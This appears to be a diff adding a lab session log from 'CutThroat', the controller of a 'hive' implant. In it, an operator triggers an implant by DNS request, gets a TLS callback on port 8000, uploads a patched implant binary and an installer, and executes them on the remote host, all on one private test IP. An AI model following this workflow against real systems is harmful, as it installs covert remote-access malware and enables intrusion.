@@ -1,0 +1,131 @@
+[0;37;40m[success] Successfully loaded ./hive [load]
+
+CutThroat
+JY008C634-6
+Version: 2.2
+CCS Version: 2.2
+
+Usage:
+
+	verbosity <level>	Sets the verbosity level
+	mode <new mode>		Sets the operating mode of CT
+	load <ILM Filename>	Loads the library
+	quit			Exits Command Post
+[?1034h
+> ilm connect 10.3.2.55
+ilm connect 10.3.2.55
+
+ WARNING:  The requested file [10.3.2.55] could not be opened so we will attempt to create a new one with the same name.
+
+ Callback IP address?   10.3.2.55
+  10.3.2.55
+ Callback Port number [1-65535]?   8000
+  8000
+ Remote IP address?     10.3.2.55
+  10.3.2.55
+ Trigger type [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]?   dns-request
+  dns-request
+ Listening for connection on port 8000 ...
+
+ Trigger details: 
+  . Remote IP address 10.3.2.55 with dns-request trigger 
+  . Callback IP address 10.3.2.55 on port 8000
+
+ Trigger sent.
+
+ ... connection established!
+
+ Connection details:
+  . Remote IP address 10.3.2.55 on port 32931
+  . Local  IP address 10.3.2.55 on port 8000
+
+ Enabling encrypted communications:
+  . TLS handshake complete.
+
+[Success] 
+************ Success ************
+[ilm connect 10.3.2.55]
+
+[10.3.2.55]>   file put hived-linux-i386-PATCHED /home/miker/tempPayload
+  file put hived-linux-i386-PATCHED /home/miker/tempPayload
+ Local File: hived-linux-i386-PATCHED
+ Remote File: /home/miker/tempPayload
+ successful upload of 170784 bytes from hived-linux-i386-PATCHED to /home/miker/tempPayload
+[Success] 
+************ Success ************
+[file put hived-linux-i386-PATCHED /home/miker/tempPayload]
+
+[10.3.2.55]>   cmd exec "chmod 755 /home/miker/tempPayload"
+  cmd exec "chmod 755 /home/miker/tempPayload"
+[Success] 
+************ Success ************
+[cmd exec chmod 755 /home/miker/tempPayload]
+
+[10.3.2.55]>   file put tempInstall /home/miker/tempInstall
+  file put tempInstall /home/miker/tempInstall
+ Local File: tempInstall
+ Remote File: /home/miker/tempInstall
+ successful upload of 952 bytes from tempInstall to /home/miker/tempInstall
+[Success] 
+************ Success ************
+[file put tempInstall /home/miker/tempInstall]
+
+[10.3.2.55]>   cmd exec "chmod 755 /home/miker/tempInstall"
+  cmd exec "chmod 755 /home/miker/tempInstall"
+[Success] 
+************ Success ************
+[cmd exec chmod 755 /home/miker/tempInstall]
+
+[10.3.2.55]>   cmd exec /home/miker/tempInstall
+  cmd exec /home/miker/tempInstall
+[0;37;40m[success] Successfully loaded ./hive [load]
+
+CutThroat
+JY008C634-6
+Version: 2.2
+CCS Version: 2.2
+
+Usage:
+
+	verbosity <level>	Sets the verbosity level
+	mode <new mode>		Sets the operating mode of CT
+	load <ILM Filename>	Loads the library
+	quit			Exits Command Post
+[?1034h
+> ilm connect 10.3.2.55
+ilm connect 10.3.2.55
+
+ WARNING:  The requested file [10.3.2.55] could not be opened so we will attempt to create a new one with the same name.
+
+ Callback IP address?   10.3.2.55
+  10.3.2.55
+ Callback Port number [1-65535]?   8000
+  8000
+ Remote IP address?     10.3.2.55
+  10.3.2.55
+ Trigger type [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]?   dns-request
+  dns-request
+ Listening for connection on port 8000 ...
+
+ Trigger details: 
+  . Remote IP address 10.3.2.55 with dns-request trigger 
+  . Callback IP address 10.3.2.55 on port 8000
+
+ Trigger sent.
+
+ ... connection established!
+
+ Connection details:
+  . Remote IP address 10.3.2.55 on port 32935
+  . Local  IP address 10.3.2.55 on port 8000
+
+ Enabling encrypted communications:
+  . TLS handshake complete.
+
+[Success] 
+************ Success ************
+[ilm connect 10.3.2.55]
+
+[10.3.2.55]>   quit 
+  quit 
+[0;39;49m
